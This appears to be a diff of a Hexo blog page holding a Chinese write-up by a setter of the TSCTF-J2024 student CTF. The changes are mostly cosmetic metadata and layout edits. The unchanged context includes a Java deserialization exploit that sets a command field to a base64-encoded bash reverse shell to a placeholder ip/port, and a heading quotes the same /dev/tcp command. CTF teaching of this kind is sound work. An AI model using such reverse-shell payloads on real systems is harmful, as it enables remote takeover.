@@ -20,16 +20,16 @@
     var CONFIG = {"hostname":"doublewalnut.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="set set what(WEB 签到)解法1： 修改html前端拖动条范围上下界，直接拖 解法2： 看js里面最开始有个函数叫setSliderValue 控制台输入 setSliderValue(xxxxx) 解法3： 也有逆向手喜欢看js混淆后的代码，找到qq号十六进制后的数据地方 1_0x167719 &#x3D;&#x3D; 0x993be543 &amp;&amp; alert(_0x1d4b54);">
+  <meta name="description" content="set set what(WEB 签到)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TSCTF-J2024 WP">
 <meta property="og:url" content="http://doublewalnut.cn/post/tsctf-j2024.html">
 <meta property="og:site_name" content="DoubleLi&#39;s Blog">
-<meta property="og:description" content="set set what(WEB 签到)解法1： 修改html前端拖动条范围上下界，直接拖 解法2： 看js里面最开始有个函数叫setSliderValue 控制台输入 setSliderValue(xxxxx) 解法3： 也有逆向手喜欢看js混淆后的代码，找到qq号十六进制后的数据地方 1_0x167719 &#x3D;&#x3D; 0x993be543 &amp;&amp; alert(_0x1d4b54);">
+<meta property="og:description" content="set set what(WEB 签到)">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66ee33e9f21886ccc0cf7425.jpg">
 <meta property="article:published_time" content="2024-09-21T02:16:24.000Z">
-<meta property="article:modified_time" content="2024-09-22T08:20:40.827Z">
+<meta property="article:modified_time" content="2024-09-22T14:01:19.724Z">
 <meta property="article:author" content="Double Li">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -234,7 +234,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-22 16:20:40" itemprop="dateModified" datetime="2024-09-22T16:20:40+08:00">2024-09-22</time>
+                <time title="修改时间：2024-09-22 22:01:19" itemprop="dateModified" datetime="2024-09-22T22:01:19+08:00">2024-09-22</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -259,7 +259,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>989</span>
+              <span>990</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -278,7 +278,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="set-set-what-WEB-签到"><a href="#set-set-what-WEB-签到" class="headerlink" title="set set what(WEB 签到)"></a>set set what(WEB 签到)</h2><p>解法1： 修改html前端拖动条范围上下界，直接拖</p>
+        <h2 id="set-set-what-WEB-签到"><a href="#set-set-what-WEB-签到" class="headerlink" title="set set what(WEB 签到)"></a>set set what(WEB 签到)</h2><span id="more"></span>
+
+<p>解法1： 修改html前端拖动条范围上下界，直接拖</p>
 <p>解法2： 看js里面最开始有个函数叫<code>setSliderValue</code> 控制台输入 setSliderValue(xxxxx)</p>
 <p>解法3： 也有逆向手喜欢看js混淆后的代码，找到qq号十六进制后的数据地方</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_0x167719 == <span class="number">0x993be543</span> &amp;&amp; <span class="title function_">alert</span>(_0x1d4b54);</span><br></pre></td></tr></table></figure>
@@ -324,7 +326,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.avasec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Calc C=<span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> C.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hasPermission&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(C,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(C,<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;BUPT&quot;</span>);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;merak&quot;</span>);</span><br><span class="line">        oos.writeObject(C);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">      System.out.println(Utils.bytesTohexString(barr.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>​          </p>
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>整体上个人评价我出的新生赛难度刚好，前端题是为了当大家一开始有解hhh，也体会过一场比赛如果前面一大半时间0解的话难免有挫败感然后不做了，有个题出也能让大家更好的状态去看其他题。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>整体上个人评价我出的新生赛难度刚好，前端题是为了当大家一开始有解hhh，也体会过一场比赛如果前面一大半时间0解的话难免有挫败感然后不做了，有个题出也能让大家更好的状态去看其他题。</p>
 <p>原型链污染倒是随手加的，两次污染，没有Waf，理解下代码，还是一个比较正常的题。（比较喜欢题目名字）</p>
 <p>除了可以秒了Reflection这个题的师傅之外，相信这应该是其他师傅的第一道Java题目，遇到的反弹shell，本地调试，目录结构等问题，看完这个题后续java安全的一些基础部分应该不会卡太久，希望这道题目对一些问题可以做到基本的解惑，也祝各位师傅安全之路畅通无阻！</p>
 
@@ -408,7 +410,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#set-set-what-WEB-%E7%AD%BE%E5%88%B0"><span class="nav-number">1.</span> <span class="nav-text">set set what(WEB 签到)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E9%97%BB%E5%88%B0%E4%BA%86-%E5%B7%A7%E7%89%A9-%E7%9A%84%E6%B8%85%E9%A6%99"><span class="nav-number">2.</span> <span class="nav-text">我闻到了[巧物]的清香</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%91%9E%E7%A6%8F%E8%8E%B1%E5%85%8B%E7%8F%85"><span class="nav-number">3.</span> <span class="nav-text">瑞福莱克珅</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5Runtime-getRuntime-exec-bash-i-dev-tcp-ip-port-0-1"><span class="nav-number">3.1.</span> <span class="nav-text">为什么不能直接Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot;);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8A%8A%E5%90%84%E4%B8%AA%E7%B1%BB%E5%A4%8D%E5%88%B6%E8%BF%9B%E5%8E%BB%E5%86%99%E7%9A%84exp%E5%BE%97%E5%88%B0%E7%9A%84hex%E6%97%A0%E6%B3%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.2.</span> <span class="nav-text">为什么把各个类复制进去写的exp得到的hex无法命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">3.3.</span> <span class="nav-text">后记</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#set-set-what-WEB-%E7%AD%BE%E5%88%B0"><span class="nav-number">1.</span> <span class="nav-text">set set what(WEB 签到)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E9%97%BB%E5%88%B0%E4%BA%86-%E5%B7%A7%E7%89%A9-%E7%9A%84%E6%B8%85%E9%A6%99"><span class="nav-number">2.</span> <span class="nav-text">我闻到了[巧物]的清香</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%91%9E%E7%A6%8F%E8%8E%B1%E5%85%8B%E7%8F%85"><span class="nav-number">3.</span> <span class="nav-text">瑞福莱克珅</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5Runtime-getRuntime-exec-bash-i-dev-tcp-ip-port-0-1"><span class="nav-number">3.1.</span> <span class="nav-text">为什么不能直接Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot;);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8A%8A%E5%90%84%E4%B8%AA%E7%B1%BB%E5%A4%8D%E5%88%B6%E8%BF%9B%E5%8E%BB%E5%86%99%E7%9A%84exp%E5%BE%97%E5%88%B0%E7%9A%84hex%E6%97%A0%E6%B3%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.2.</span> <span class="nav-text">为什么把各个类复制进去写的exp得到的hex无法命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
